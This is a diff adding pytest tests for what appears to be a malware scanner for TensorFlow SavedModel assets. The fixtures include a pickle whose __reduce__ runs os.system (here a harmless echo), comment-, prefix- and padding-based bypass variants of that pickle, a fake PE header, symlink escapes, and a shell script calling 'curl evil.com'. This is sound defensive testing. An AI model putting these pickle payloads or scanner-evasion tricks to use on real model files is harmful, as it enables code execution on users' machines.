@@ -131,6 +131,24 @@ def create_tf_savedmodel(tmp_path: Path, *, malicious: bool = False) -> Path:
     return model_dir
 
 
+def _build_protocol1_pickle_payload() -> bytes:
+    import os as os_module
+
+    class DangerousPayload:
+        def __reduce__(self) -> tuple[object, tuple[str]]:
+            return (os_module.system, ("echo savedmodel-asset-test",))
+
+    return pickle.dumps(DangerousPayload(), protocol=1)
+
+
+def _build_minimal_pe_bytes() -> bytes:
+    payload = bytearray(0x80)
+    payload[0:2] = b"MZ"
+    payload[0x3C:0x40] = (0x40).to_bytes(4, "little")
+    payload[0x40:0x44] = b"PE\x00\x00"
+    return bytes(payload)
+
+
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_tf_savedmodel_scanner_safe_model(tmp_path: Path) -> None:
     """Test scanning a safe TensorFlow SavedModel."""
@@ -462,6 +480,260 @@ def test_tf_savedmodel_scanner_with_blacklist(tmp_path: Path) -> None:
     # Should detect our blacklisted pattern
     blacklist_issues = [issue for issue in result.issues if "suspicious_function" in issue.message.lower()]
     assert len(blacklist_issues) > 0
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_assets_benign_text_file_passes(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    (model_dir / "assets" / "vocab.txt").write_text("token_a\ntoken_b\n", encoding="utf-8")
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    asset_checks = [check for check in result.checks if check.name == "SavedModel Assets Security Check"]
+
+    assert asset_checks == []
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_assets_shell_script_is_flagged(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    asset_path = model_dir / "assets" / "evil.sh"
+    asset_path.write_text("#!/bin/bash\ncurl evil.com\n", encoding="utf-8")
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    asset_issues = [
+        issue
+        for issue in result.issues
+        if issue.location == str(asset_path) and issue.message.startswith("Suspicious executable-like content")
+    ]
+
+    assert asset_issues
+    assert all(issue.severity == IssueSeverity.WARNING for issue in asset_issues)
+    assert all(
+        issue.details.get("detected_content_type") and "script_shebang" in issue.details["detected_content_type"]
+        for issue in asset_issues
+    )
+    assert all(issue.details.get("file_name") == "evil.sh" for issue in asset_issues)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_assets_python_pattern_in_non_py_file_is_flagged(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    asset_path = model_dir / "assets" / "helper.dat"
+    asset_path.write_text("import os\n\ndef runner():\n    return os.getenv('HOME')\n", encoding="utf-8")
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    matching_checks = [
+        check
+        for check in result.checks
+        if check.name == "SavedModel Assets Security Check" and check.location == str(asset_path)
+    ]
+
+    assert matching_checks
+    assert all(check.severity == IssueSeverity.WARNING for check in matching_checks)
+    assert all(
+        check.details.get("detected_content_type") and "python_source_pattern" in check.details["detected_content_type"]
+        for check in matching_checks
+    )
+    assert all(isinstance(check.details.get("size"), int) and check.details["size"] > 0 for check in matching_checks)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_assets_numeric_class_labels_do_not_trigger_python_source_detection(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    asset_path = model_dir / "assets" / "labels.txt"
+    asset_path.write_text("class 1: dog\nclass 2: cat\n", encoding="utf-8")
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    matching_checks = [
+        check
+        for check in result.checks
+        if check.name == "SavedModel Assets Security Check" and check.location == str(asset_path)
+    ]
+
+    assert matching_checks == []
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_assets_extra_pe_executable_is_flagged(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    extra_dir = model_dir / "assets.extra"
+    extra_dir.mkdir(exist_ok=True)
+    pe_path = extra_dir / "helper.dll"
+    pe_path.write_bytes(_build_minimal_pe_bytes())
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    asset_issues = [issue for issue in result.issues if issue.location == str(pe_path)]
+    assert asset_issues
+    assert any("pe_executable" in issue.details.get("detected_content_type", "") for issue in asset_issues)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_asset_symlink_is_reported_without_following_target(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    external_script = tmp_path / "outside.sh"
+    external_script.write_text("#!/bin/bash\necho escape\n", encoding="utf-8")
+    asset_path = model_dir / "assets" / "outside-link.sh"
+    try:
+        asset_path.symlink_to(external_script)
+    except (NotImplementedError, OSError, PermissionError) as exc:
+        pytest.skip(f"Symlinks unavailable in test environment: {exc}")
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
+
+    assert asset_issues
+    assert all(issue.severity == IssueSeverity.WARNING for issue in asset_issues)
+    assert all("symlink" in issue.message.lower() for issue in asset_issues)
+    assert all(issue.details.get("detected_content_type") == "unscannable_asset" for issue in asset_issues)
+    assert all(issue.details.get("asset_kind") == "symlink" for issue in asset_issues)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_asset_symlink_is_not_followed_by_blacklist_scan(
+    tmp_path: Path,
+    requires_symlinks: None,
+) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    external_text = tmp_path / "outside.txt"
+    external_text.write_text("contains suspicious_function\n", encoding="utf-8")
+    asset_path = model_dir / "assets" / "outside-link.txt"
+    asset_path.symlink_to(external_text)
+
+    result = TensorFlowSavedModelScanner(config={"blacklist_patterns": ["suspicious_function"]}).scan(str(model_dir))
+    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
+
+    assert asset_issues
+    assert any(issue.details.get("asset_kind") == "symlink" for issue in asset_issues)
+    assert all("blacklisted pattern" not in issue.message.lower() for issue in asset_issues)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_asset_directory_symlink_is_not_traversed(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    external_dir = tmp_path / "outside-assets"
+    external_dir.mkdir()
+    (external_dir / "outside.sh").write_text("#!/bin/bash\necho escape\n", encoding="utf-8")
+    extra_dir = model_dir / "assets.extra"
+    try:
+        extra_dir.symlink_to(external_dir, target_is_directory=True)
+    except (NotImplementedError, OSError, PermissionError) as exc:
+        pytest.skip(f"Symlinks unavailable in test environment: {exc}")
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+
+    symlink_dir_issues = [issue for issue in result.issues if issue.location == str(extra_dir)]
+    traversed_issues = [issue for issue in result.issues if issue.location and issue.location.endswith("outside.sh")]
+
+    assert symlink_dir_issues
+    assert all(issue.severity == IssueSeverity.WARNING for issue in symlink_dir_issues)
+    assert all("symlinked asset directory" in issue.message.lower() for issue in symlink_dir_issues)
+    assert all(issue.details.get("detected_content_type") == "unscannable_asset_dir" for issue in symlink_dir_issues)
+    assert all(issue.details.get("asset_kind") == "symlink_directory" for issue in symlink_dir_issues)
+    assert traversed_issues == []
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_dangling_asset_directory_symlink_is_reported(
+    tmp_path: Path,
+    requires_symlinks: None,
+) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    extra_dir = model_dir / "assets.extra"
+    extra_dir.symlink_to(tmp_path / "missing-assets", target_is_directory=True)
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    symlink_dir_issues = [issue for issue in result.issues if issue.location == str(extra_dir)]
+
+    assert symlink_dir_issues
+    assert all(issue.severity == IssueSeverity.WARNING for issue in symlink_dir_issues)
+    assert all("symlinked asset directory" in issue.message.lower() for issue in symlink_dir_issues)
+    assert all(issue.details.get("detected_content_type") == "unscannable_asset_dir" for issue in symlink_dir_issues)
+    assert all(issue.details.get("asset_kind") == "symlink_directory" for issue in symlink_dir_issues)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_nested_asset_directory_symlink_is_reported_without_traversal(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    external_dir = tmp_path / "outside-nested-assets"
+    external_dir.mkdir()
+    (external_dir / "outside.sh").write_text("#!/bin/bash\necho escape\n", encoding="utf-8")
+    nested_dir = model_dir / "assets" / "nested"
+    try:
+        nested_dir.symlink_to(external_dir, target_is_directory=True)
+    except (NotImplementedError, OSError, PermissionError) as exc:
+        pytest.skip(f"Symlinks unavailable in test environment: {exc}")
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+
+    nested_dir_issues = [issue for issue in result.issues if issue.location == str(nested_dir)]
+    traversed_issues = [issue for issue in result.issues if issue.location and issue.location.endswith("outside.sh")]
+
+    assert nested_dir_issues
+    assert all(issue.severity == IssueSeverity.WARNING for issue in nested_dir_issues)
+    assert all("symlinked nested asset directory" in issue.message.lower() for issue in nested_dir_issues)
+    assert all(issue.details.get("detected_content_type") == "unscannable_asset_dir" for issue in nested_dir_issues)
+    assert all(issue.details.get("asset_kind") == "symlink_directory" for issue in nested_dir_issues)
+    assert traversed_issues == []
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_assets_protocol1_pickle_is_flagged(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    asset_path = model_dir / "assets" / "payload.dat"
+    asset_path.write_bytes(_build_protocol1_pickle_payload())
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
+
+    assert asset_issues
+    assert any("pickle_payload" in issue.details.get("detected_content_type", "") for issue in asset_issues)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_assets_protocol1_pickle_with_binint1_pop_prefix_is_flagged(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    asset_path = model_dir / "assets" / "prefixed-payload.dat"
+    asset_path.write_bytes(b"K\x000" + _build_protocol1_pickle_payload())
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
+
+    assert asset_issues
+    assert any("pickle_payload" in issue.details.get("detected_content_type", "") for issue in asset_issues)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_assets_extra_comment_prefixed_protocol1_pickle_is_flagged(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    extra_dir = model_dir / "assets.extra"
+    extra_dir.mkdir(exist_ok=True)
+    asset_path = extra_dir / "bypass.dat"
+    asset_path.write_bytes(b"#" + _build_protocol1_pickle_payload())
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
+
+    assert asset_issues
+    assert any("pickle_payload" in issue.details.get("detected_content_type", "") for issue in asset_issues)
+    assert all(
+        issue.details.get("detected_content_type", "").split(", ").count("pickle_payload") == 1
+        for issue in asset_issues
+    )
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_assets_extra_long_comment_prefixed_protocol1_pickle_is_flagged(tmp_path: Path) -> None:
+    model_dir = Path(create_tf_savedmodel(tmp_path))
+    extra_dir = model_dir / "assets.extra"
+    extra_dir.mkdir(exist_ok=True)
+    asset_path = extra_dir / "deep_bypass.dat"
+    asset_path.write_bytes((b"# asset padding for documentation only\n" * 300) + _build_protocol1_pickle_payload())
+
+    result = TensorFlowSavedModelScanner().scan(str(model_dir))
+    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]
+
+    assert asset_issues
+    assert any("pickle_payload" in issue.details.get("detected_content_type", "") for issue in asset_issues)
 
 
 def test_tf_savedmodel_scanner_not_a_directory(tmp_path):
